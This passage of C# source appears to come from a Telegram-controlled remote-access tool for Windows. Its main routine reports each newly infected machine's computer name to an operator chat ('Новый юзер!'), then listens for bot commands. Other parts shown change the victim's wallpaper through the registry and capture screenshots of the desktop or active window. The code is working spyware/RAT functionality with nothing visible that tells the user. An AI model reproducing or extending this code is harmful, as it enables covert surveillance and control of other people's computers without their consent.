                System.Drawing.Image img = Image.FromStream(s);
                string tempPath = Path.Combine(Path.GetTempPath(), "wallpaper.bmp");
                img.Save(tempPath, ImageFormat.Bmp);

                Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Control Panel\Desktop", true);
                if (style == Style.Fill)
                {
                    key.SetValue(@"WallpaperStyle", 10.ToString());
                    key.SetValue(@"TileWallpaper", 0.ToString());
                }
                if (style == Style.Fit)
                {
                    key.SetValue(@"WallpaperStyle", 6.ToString());
                    key.SetValue(@"TileWallpaper", 0.ToString());
                }
                if (style == Style.Span) // Windows 8 or newer only!
                {
                    key.SetValue(@"WallpaperStyle", 22.ToString());
                    key.SetValue(@"TileWallpaper", 0.ToString());
                }
                if (style == Style.Stretch)
                {
                    key.SetValue(@"WallpaperStyle", 2.ToString());
                    key.SetValue(@"TileWallpaper", 0.ToString());
                }
                if (style == Style.Tile)
                {
                    key.SetValue(@"WallpaperStyle", 0.ToString());
                    key.SetValue(@"TileWallpaper", 1.ToString());
                }
                if (style == Style.Center)
                {
                    key.SetValue(@"WallpaperStyle", 0.ToString());
                    key.SetValue(@"TileWallpaper", 0.ToString());
                }

                SystemParametersInfo(SPI_SETDESKWALLPAPER,
                    0,
                    tempPath,
                    SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
            }
        }


        static void Main(string[] args)
        {
            Console.WriteLine("[*] Запущен бот: " + bot.GetMeAsync().Result.FirstName);
            
            bot.SendTextMessageAsync(chat_id, "Новый юзер!\n\n\t\t\t\t\t\t🟢 " + strComputerName);

            var cts = new CancellationTokenSource();
            var cancellationToken = cts.Token;
            var receiverOptions = new ReceiverOptions
            {
                AllowedUpdates = { },
            };
            bot.StartReceiving(
                HandleUpdateAsync,
                HandleErrorAsync,
                receiverOptions,
                cancellationToken
            );
            Console.ReadLine();
        }
    }
    public class ScreenCapture
    {
        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
        public static extern IntPtr GetDesktopWindow();

        [StructLayout(LayoutKind.Sequential)]
        private struct Rect
        {
            public int Left;
            public int Top;
            public int Right;
            public int Bottom;
        }

        [DllImport("user32.dll")]
        private static extern IntPtr GetWindowRect(IntPtr hWnd, ref Rect rect);

        public static Image CaptureDesktop()
        {
            return CaptureWindow(GetDesktopWindow());
        }

        public static Bitmap CaptureActiveWindow()
        {
            return CaptureWindow(GetForegroundWindow());
        }

        public static Bitmap CaptureWindow(IntPtr handle)
        {
            var rect = new Rect();
            GetWindowRect(handle, ref rect);
            var bounds = new Rectangle(rect.Left, rect.Top, rect.Right - rect.Left, rect.Bottom - rect.Top);
            var result = new Bitmap(bounds.Width, bounds.Height);

            using (var graphics = Graphics.FromImage(result))
            {
                graphics.CopyFromScreen(new Point(bounds.Left, bounds.Top), Point.Empty, bounds.Size);
            }

            return result;
        }
    }

}
